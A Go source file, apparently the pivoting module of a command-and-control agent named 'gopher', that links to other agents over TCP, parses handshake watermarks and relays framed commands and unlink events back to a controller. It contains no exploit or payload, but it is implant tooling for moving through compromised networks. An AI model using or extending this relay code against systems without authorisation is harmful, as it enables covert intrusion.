package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"gopher/functions"
	"gopher/utils"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var errInvalidPivotFrameLength = errors.New("invalid pivot frame length")

func isStreamBroken(err error) bool {
	if err == nil {
		return false
	}
	if err == io.EOF || errors.Is(err, io.ErrUnexpectedEOF) {
		return true
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "broken") ||
		strings.Contains(s, "closed") ||
		strings.Contains(s, "reset") ||
		strings.Contains(s, "connection refused") ||
		strings.Contains(s, "use of closed")
}

type PivotData struct {
	Id     uint32
	Type   int
	Conn   net.Conn
	Active bool
}

type Pivotter struct {
	mu     sync.Mutex
	pivots []*PivotData
}

func NewPivotter() *Pivotter {
	return &Pivotter{}
}

type pivotPipeFlusher interface {
	flushPivotPipe() error
}

func pivotWritePayload(conn net.Conn, p []byte) error {
	if len(p) == 0 {
		return nil
	}
	if _, ok := conn.(pivotPipeFlusher); ok {
		n, err := conn.Write(p)
		if err != nil {
			return err
		}
		if n != len(p) {
			return fmt.Errorf("%w: wrote %d of %d", io.ErrShortWrite, n, len(p))
		}
		return nil
	}
	return functions.WriteFull(conn, p)
}

func pivotSendFrame(conn net.Conn, data []byte) error {
	const chunkSize = 0x2000
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if err := pivotWritePayload(conn, hdr); err != nil {
		return err
	}
	for offset := 0; offset < len(data); {
		end := offset + chunkSize
		if end > len(data) {
			end = len(data)
		}
		if err := pivotWritePayload(conn, data[offset:end]); err != nil {
			return err
		}
		offset = end
	}
	if f, ok := conn.(pivotPipeFlusher); ok {
		return f.flushPivotPipe()
	}
	return nil
}

func pivotRecvFrame(conn net.Conn, deadline time.Duration) ([]byte, error) {
	var deadlineTime time.Time
	if deadline > 0 {
		deadlineTime = time.Now().Add(deadline)
		conn.SetReadDeadline(deadlineTime)
	}
	defer conn.SetReadDeadline(time.Time{})

	hdr := make([]byte, 4)
	if _, err := readFull(conn, hdr); err != nil {
		return nil, err
	}
	frameLen := binary.LittleEndian.Uint32(hdr)
	if frameLen > 0x1000000 {
		return nil, fmt.Errorf("%w: %d", errInvalidPivotFrameLength, frameLen)
	}

	if deadline > 0 && time.Until(deadlineTime) < 5*time.Second {
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	}

	buf := make([]byte, frameLen)
	if _, err := readFull(conn, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
		if n == 0 {
			return total, io.ErrUnexpectedEOF
		}
	}
	return total, nil
}

func (p *Pivotter) LinkTCP(taskId uint32, addr string, port int) ([]byte, error) {
	target := net.JoinHostPort(addr, fmt.Sprintf("%d", port))
	d := net.Dialer{Timeout: 45 * time.Second, KeepAlive: 30 * time.Second}
	conn, err := d.Dial("tcp", target)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to %s: %w", target, err)
	}

	beat, err := pivotRecvFrame(conn, 15*time.Second)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to read handshake from %s: %w", target, err)
	}

	if len(beat) < 5 {
		conn.Close()
		return nil, errors.New("handshake too short")
	}

	pivot := &PivotData{
		Id:     taskId,
		Type:   utils.PIVOT_TYPE_TCP,
		Conn:   conn,
		Active: true,
	}

	p.mu.Lock()
	p.pivots = append(p.pivots, pivot)
	p.mu.Unlock()


	watermark := binary.LittleEndian.Uint32(beat[:4])
	beatData := beat[4:]

	ans, _ := msgpack.Marshal(utils.AnsLink{
		Type:      utils.PIVOT_TYPE_TCP,
		Watermark: watermark,
		Beat:      beatData,
	})
	return ans, nil
}

func (p *Pivotter) Unlink(pivotId uint32) ([]byte, error) {
	p.mu.Lock()
	defer p.mu.Unlock()

	for i, pv := range p.pivots {
		if pv.Id == pivotId {
			pv.Active = false
			pv.Conn.Close()
			pivotType := pv.Type
			p.pivots = append(p.pivots[:i], p.pivots[i+1:]...)

			ans, _ := msgpack.Marshal(utils.AnsUnlink{
				PivotId: pivotId,
				Type:    pivotType,
			})
			return ans, nil
		}
	}
	return nil, fmt.Errorf("pivot %08x not found", pivotId)
}

func (p *Pivotter) WritePivot(pivotId uint32, data []byte) error {
	p.mu.Lock()
	var target *PivotData
	for _, pv := range p.pivots {
		if pv.Id == pivotId && pv.Active {
			target = pv
			break
		}
	}
	p.mu.Unlock()

	if target == nil {
		return fmt.Errorf("pivot %08x not found or inactive", pivotId)
	}
	if len(data) == 0 {
		return nil
	}
	err := pivotSendFrame(target.Conn, data)
	return err
}

func (p *Pivotter) ProcessPivots() [][]byte {
	type snapshotEntry struct {
		Id     uint32
		Type   int
		Conn   net.Conn
		Active bool
	}

	p.mu.Lock()
	snapshot := make([]snapshotEntry, 0, len(p.pivots))
	for _, pv := range p.pivots {
		snapshot = append(snapshot, snapshotEntry{
			Id:     pv.Id,
			Type:   pv.Type,
			Conn:   pv.Conn,
			Active: pv.Active,
		})
	}
	p.mu.Unlock()

	var results [][]byte
	var disconnected []uint32

	for _, pv := range snapshot {
		if !pv.Active {
			continue
		}

		pollTimeout := 100 * time.Millisecond
		if pv.Type == utils.PIVOT_TYPE_SMB {
			pollTimeout = 150 * time.Millisecond
		}

		framesThisPivot := 0
		for {
			frame, err := pivotRecvFrame(pv.Conn, pollTimeout)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					break
				}
				if err == io.EOF || errors.Is(err, io.ErrUnexpectedEOF) || isStreamBroken(err) || errors.Is(err, errInvalidPivotFrameLength) {
					disconnected = append(disconnected, pv.Id)

					cmd := utils.Command{
						Code: utils.COMMAND_UNLINK,
						Id:   0,
					}
					cmd.Data, _ = msgpack.Marshal(utils.AnsUnlink{
						PivotId: pv.Id,
						Type:    utils.PIVOT_TYPE_DISCONNECT,
					})
					packed, _ := msgpack.Marshal(cmd)
					results = append(results, packed)
				}
				break
			}

			cmd := utils.Command{
				Code: utils.COMMAND_PIVOT_EXEC,
				Id:   0,
			}
			cmd.Data, _ = msgpack.Marshal(utils.AnsPivotExec{
				PivotId: pv.Id,
				Data:    frame,
			})
			packed, _ := msgpack.Marshal(cmd)
			results = append(results, packed)
			framesThisPivot++
		}
	}

	if len(results) > 0 {
	}

	if len(disconnected) > 0 {
		p.mu.Lock()
		for _, did := range disconnected {
			for i, pv := range p.pivots {
				if pv.Id == did {
					pv.Conn.Close()
					p.pivots = append(p.pivots[:i], p.pivots[i+1:]...)
					break
				}
			}
		}
		p.mu.Unlock()
	}

	return results
}

func (p *Pivotter) HasActivePivots() bool {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, pv := range p.pivots {
		if pv.Active {
			return true
		}
	}
	return false
}

func (p *Pivotter) CloseAll() {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, pv := range p.pivots {
		pv.Active = false
		pv.Conn.Close()
	}
	p.pivots = nil
}

type pipeAddr struct{}

func (pipeAddr) Network() string { return "pipe" }
func (pipeAddr) String() string  { return "pipe" }

type timeoutError struct{}

func (e *timeoutError) Error() string   { return "i/o timeout" }
func (e *timeoutError) Timeout() bool   { return true }
func (e *timeoutError) Temporary() bool { return true }
